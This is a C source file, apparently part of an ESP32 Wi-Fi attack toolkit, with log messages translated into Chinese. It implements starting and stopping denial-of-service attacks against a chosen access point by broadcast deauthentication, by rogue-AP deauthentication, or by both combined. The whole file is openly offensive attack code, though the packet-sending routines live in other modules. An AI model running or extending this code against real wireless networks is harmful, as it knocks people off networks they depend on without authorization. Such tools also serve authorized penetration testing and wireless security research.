/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "正在启动拒绝服务攻击...");
    method = attack_config->method;
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGD(TAG, "拒绝服务方法：广播取消认证");
            attack_method_broadcast(attack_config->ap_record, 1);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "拒绝服务方法：伪造 AP 取消认证");
            attack_method_rogueap(attack_config->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGD(TAG, "拒绝服务方法：伪造 AP 取消认证");
            attack_method_rogueap(attack_config->ap_record);
            attack_method_broadcast(attack_config->ap_record, 1);
            break;
        default:
            ESP_LOGE(TAG, "方法未知，拒绝服务攻击未启动");
    }
}

void attack_dos_stop() {
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "未知攻击方法，攻击可能无法正确停止");
    }
    ESP_LOGI(TAG, "拒绝服务攻击已停止");
}